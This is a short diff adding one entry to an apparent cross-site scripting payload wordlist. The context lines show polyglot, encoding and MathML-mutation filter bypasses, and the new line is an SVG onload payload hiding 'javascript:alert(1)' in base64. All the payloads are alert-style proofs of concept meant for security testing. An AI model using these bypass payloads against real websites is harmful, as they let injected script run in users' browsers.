@@ -1732,3 +1732,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <script>import('data:t\ext/\ecmascript\,alert%601%60')</script>
 <math><annotation-xml encoding="text/html"><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></math>
 <math><annotation-xml encoding="text/html"><script>&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</script></math>
+<svg/onload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;//
